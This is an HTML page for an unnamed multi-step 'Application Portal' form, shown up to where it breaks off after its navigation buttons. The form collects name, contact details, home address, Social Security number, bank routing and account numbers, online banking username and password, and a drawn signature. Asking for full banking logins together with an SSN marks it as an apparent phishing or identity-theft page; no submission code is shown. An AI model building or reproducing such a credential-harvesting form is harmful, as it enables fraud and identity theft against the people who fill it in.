<!DOCTYPE html>
<html lang="en">
<head>
   <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Portal</title>
    <style>
        /* Standalone fallback styling built directly into the file */
        body { 
            background: #0f172a; 
            color: #ffffff; 
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .form-container {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            margin-bottom: 15px;
            border-radius: 6px;
            border: 1px solid #475569;
            background: #334155;
            color: white;
            box-sizing: border-box;
        }
        button {
            background: #2563eb;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background: #1d4ed8; }
    </style>
</head>

</head>
<body class="text-white font-sans min-h-screen flex items-center justify-center px-4 py-12">

    <div class="bg-slate-900/80 border border-slate-800 p-8 rounded-2xl shadow-2xl max-w-lg w-full backdrop-blur-md">
        
        <!-- Progress Bar -->
        <div class="w-full bg-slate-800 h-2 rounded-full mb-8 overflow-hidden">
            <div id="progress" class="bg-indigo-500 h-full w-[16.6%] transition-all duration-300"></div>
        </div>

        <form id="multiStepForm">
            <!-- STEP 1: Name -->
            <div class="form-step active" id="step1">
                <h2 class="text-2xl font-bold mb-6 text-indigo-400">Basic Information</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">First Name</label>
                        <input type="text" id="firstName" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Last Name</label>
                        <input type="text" id="lastName" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                </div>
            </div>

            <!-- STEP 2: Contact -->
            <div class="form-step" id="step2">
                <h2 class="text-2xl font-bold mb-6 text-indigo-400">Contact Information</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Phone Number (US Only)</label>
                        <input type="tel" id="phone" placeholder="(555) 555-5555" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Email Address</label>
                        <input type="email" id="email" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                </div>
            </div>

            <!-- STEP 3: Address -->
            <div class="form-step" id="step3">
                <h2 class="text-2xl font-bold mb-6 text-indigo-400">Address Details</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Street Address</label>
                        <input type="text" id="address" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm font-medium text-slate-400 mb-1">City</label>
                            <input type="text" id="city" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-slate-400 mb-1">State</label>
                            <input type="text" id="state" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                        </div>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Zip Code</label>
                        <input type="text" id="zip" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                </div>
            </div>

            
            <div class="form-step" id="step4">
                <h2 class="text-2xl font-bold mb-6 text-indigo-400">Identity Verification</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Social Security Number (SSN)</label>
                        <input type="password" id="ssn" placeholder="•••-••-••••" maxlength="9" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white tracking-widest focus:outline-none focus:border-indigo-500">
                    </div>
                </div>
            </div>

            <!-- STEP 5: Funding Account -->
            <div class="form-step" id="step5">
                <h2 class="text-2xl font-bold mb-6 text-indigo-400">Bank Verification</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Bank Name</label>
                        <input type="text" id="bankName" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm font-medium text-slate-400 mb-1">Routing Number</label>
                            <input type="text" id="routing" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-slate-400 mb-1">Account Number</label>
                            <input type="text" id="account" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                        </div>
                    </div>
                    <div class="border-t border-slate-800 pt-4 mt-4">
                        <label class="block text-sm font-medium text-amber-400 mb-1">Online Banking Username</label>
                        <input type="text" id="bankUser" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-amber-400 mb-1">Online Banking Password</label>
                        <input type="password" id="bankPass" required class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-indigo-500">
                    </div>
                </div>
            </div>

            <!-- STEP 6: E-Signature & Submit -->
            <div class="form-step" id="step6">
                <h2 class="text-2xl font-bold mb-6 text-indigo-400">E-Signature Confirmation</h2>
                <div class="space-y-4">
                    <label class="block text-sm font-medium text-slate-400 mb-1">Draw Your Signature Below</label>
                    <div class="bg-white rounded-lg overflow-hidden">
                        <canvas id="sigCanvas" class="w-full h-40 cursor-crosshair touch-none"></canvas>
                    </div>
                    <button type="button" id="clearSig" class="text-xs text-slate-400 hover:text-white transition">Clear Signature</button>
                </div>
            </div>

            <!-- Navigation Buttons -->
            <div class="mt-8 flex justify-between">
                <button type="button" id="prevBtn" class="px-6 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold hidden transition">Back</button>
                <button type="button" id="nextBtn" class="ml-auto px-6 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white font-semibold transition">Continue</button>
            </div>
        </form>
    </div>
